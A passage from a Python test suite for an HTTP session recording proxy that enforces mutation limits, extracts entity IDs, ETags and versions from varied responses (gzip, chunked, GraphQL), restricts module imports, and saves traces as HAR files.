) -> None:
    upstream_app.store.seed_rows(50)

    with SessionWireTap(
        upstream_app.base_url, policy=WirePolicy(max_mutations=3)
    ) as tap:
        # 1. Location-header trailing segment fallback when JSON body has no id
        st_loc, _, _ = _http_call(
            tap.base_url,
            "POST",
            "/records/location-only",
            body={"name": "from-loc", "value": "v"},
        )
        assert st_loc == 201

        # 2. Request URL path segment fallback when PUT returns 204 No Content
        st_put, _, _ = _http_call(
            tap.base_url,
            "PUT",
            "/records/42?no_content=1",
            body={"name": "item-42-updated", "value": "v2"},
        )
        assert st_put == 204

        # 3. Programmatic record_exchange with nested data.pid and dotted meta.versionId
        rec = tap.record_exchange(
            "PATCH",
            f"{upstream_app.base_url}/entities/custom",
            request_body=b'{"status":"ready"}',
            response_status=200,
            response_headers={"ETag": 'W/"9"'},
            response_body=json.dumps(
                {"data": {"pid": "pid-777"}, "meta": {"versionId": "9"}}
            ),
        )
        assert rec is not None
        assert rec.extracted_entity_id == "pid-777"
        assert rec.etag == 'W/"9"'
        assert rec.version == "9"

        summary = tap.summary()

    assert summary.mutations_allowed == 3
    assert summary.collateral_mutations == 2
    assert summary.mutations[0].extracted_entity_id == "51"
    assert summary.mutations[1].extracted_entity_id == "42"
    assert summary.mutations[1].etag == '"v2"'
    assert summary.mutations[2].extracted_entity_id == "pid-777"


def test_wire_tap_generality_and_import_boundaries(tmp_path: Path) -> None:
    source = WIRE_TAP_PATH.read_text(encoding="utf-8")
    lowered = source.lower()
    for app_name in FORBIDDEN_APP_NAMES:
        assert (
            app_name not in lowered
        ), f"Forbidden app name {app_name!r} in wire_tap.py"

    tree = ast.parse(source, filename=str(WIRE_TAP_PATH))
    allowed_non_stdlib = {
        "pydantic",
        "openadapt_flow.tx.types",
        "openadapt_flow.tx.receipt",  # encrypted private-state writer, already import-light checked
        "openadapt_flow.wire_check",
    }
    stdlib_names = sys.stdlib_module_names

    def permitted_from_import(node):
        exact_crypto = (
            node.module == "openadapt_flow"
            and len(node.names) == 1
            and node.names[0].name == "crypto"
        )
        return (
            exact_crypto
            or node.module.split(".")[0] in stdlib_names
            or node.module in allowed_non_stdlib
        )

    assert permitted_from_import(ast.parse("from openadapt_flow import crypto").body[0])
    for unknown in (
        "from openadapt_flow import recorder",
        "from openadapt_flow import crypto, recorder",
        "from openadapt_flow import *",
    ):
        assert not permitted_from_import(ast.parse(unknown).body[0])

    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                root = alias.name.split(".")[0]
                assert root not in FORBIDDEN_IMPORT_ROOTS
                assert root in stdlib_names or alias.name in allowed_non_stdlib
        elif isinstance(node, ast.ImportFrom) and node.module:
            root = node.module.split(".")[0]
            assert root not in FORBIDDEN_IMPORT_ROOTS
            assert permitted_from_import(node)

    # Verify in a clean subprocess with sys.meta_path refusing vision/ML/playwright
    probe = textwrap.dedent(
        """
        import json, sys
        REFUSED = set(json.loads(sys.argv[1]))
        class Refuse:
            def find_spec(self, name, path=None, target=None):
                if name.partition(".")[0] in REFUSED:
                    raise ImportError("refused: " + name)
                return None
        sys.meta_path.insert(0, Refuse())
        from openadapt_flow.tx.wire_tap import SessionWireTap, WirePolicy
        tap = SessionWireTap("http://127.0.0.1:9999", policy=WirePolicy(max_mutations=1))
        tap.record_exchange("POST", "http://127.0.0.1:9999/items", b'{"a":1}', 201, b'{"id":"1"}')
        s = tap.summary()
        assert s.mutations_allowed == 1 and s.mutations[0].extracted_entity_id == "1"
        print("OK")
        """
    )
    run = subprocess.run(
        [sys.executable, "-c", probe, json.dumps(sorted(FORBIDDEN_IMPORT_ROOTS))],
        capture_output=True,
        text=True,
        cwd=tmp_path,
        timeout=30,
    )
    assert run.returncode == 0, run.stderr
    assert run.stdout.strip() == "OK"


def test_chunked_request_application_graphql_and_gzip_response_extraction(
    upstream_app: _RunningUpstream,
) -> None:
    upstream_app.store.seed_rows(50)

    with SessionWireTap(
        upstream_app.base_url,
        policy=WirePolicy(max_mutations=2),
    ) as tap:
        # 1. Raw application/graphql query -> classified as read
        tap.record_exchange(
            "POST",
            f"{upstream_app.base_url}/graphql",
            request_body="query GetPatient { patient { id } }",
            request_headers={"Content-Type": "application/graphql"},
            response_status=200,
            response_body=b'{"data":{"patient":{"id":"42"}}}',
        )
        assert tap.summary().read_requests == 1
        assert tap.summary().mutations_allowed == 0

        # 2. Gzip-compressed JSON mutation response -> still extracts entity_id & version
        gz_payload = gzip.compress(
            json.dumps({"uuid": "uuid-gz-88", "version": 4}).encode("utf-8")
        )
        rec_gz = tap.record_exchange(
            "POST",
            f"{upstream_app.base_url}/items",
            request_body=b'{"name":"gz"}',
            response_status=201,
            response_headers={
                "Content-Type": "application/json",
                "Content-Encoding": "gzip",
                "ETag": '"v4"',
            },
            response_body=gz_payload,
        )
        assert rec_gz is not None
        assert rec_gz.extracted_entity_id == "uuid-gz-88"
        assert rec_gz.version == "4"
        assert rec_gz.etag == '"v4"'

        # 3. Real HTTP Transfer-Encoding: chunked POST through proxy
        parts = urlsplit(tap.base_url)
        conn = http.client.HTTPConnection(
            parts.hostname or "127.0.0.1", parts.port or 80, timeout=10.0
        )
        try:
            conn.putrequest("POST", "/records")
            conn.putheader("Content-Type", "application/json")
            conn.putheader("Transfer-Encoding", "chunked")
            conn.endheaders()
            part1 = b'{"name":"chunked",'
            part2 = b'"value":"ok","actor":"chunk"}'
            for chunk in (part1, part2):
                conn.send(f"{len(chunk):x}\r\n".encode("ascii") + chunk + b"\r\n")
            conn.send(b"0\r\n\r\n")
            resp = conn.getresponse()
            resp_data = json.loads(resp.read())
            assert resp.status == 201
            assert resp_data["name"] == "chunked"
        finally:
            conn.close()

        summary = tap.summary()
        assert summary.read_requests == 1
        assert summary.mutations_allowed == 2
        assert summary.mutations[1].extracted_entity_id == "51"


def test_regex_routes_base_path_prefix_and_save_from_har(
    upstream_app: _RunningUpstream,
    tmp_path: Path,
) -> None:
    upstream_app.store.seed_rows(50)
    policy = WirePolicy(
        max_mutations=1,
        allowed_write_routes=(("PATCH", r"^/\d+$"),),
    )
    # Upstream URL carries `/records` base path prefix
    with SessionWireTap(
        f"{upstream_app.base_url}/records",
        policy=policy,
    ) as tap:
        st_patch, _, _ = _http_call(
            tap.base_url,
            "PATCH",
            "/42",
            body={"value": "via-prefix"},
        )
        assert st_patch == 200
        har_out = tap.save_har(tmp_path / "prefix_trace.har")

    assert har_out.exists()
    restored = SessionWireTap.from_har(har_out, policy=WirePolicy(max_mutations=1))
    s = restored.summary()
    assert s.mutations_allowed == 1
    assert s.mutations[0].extracted_entity_id == "42"
    assert s.mutations[0].version == "2"
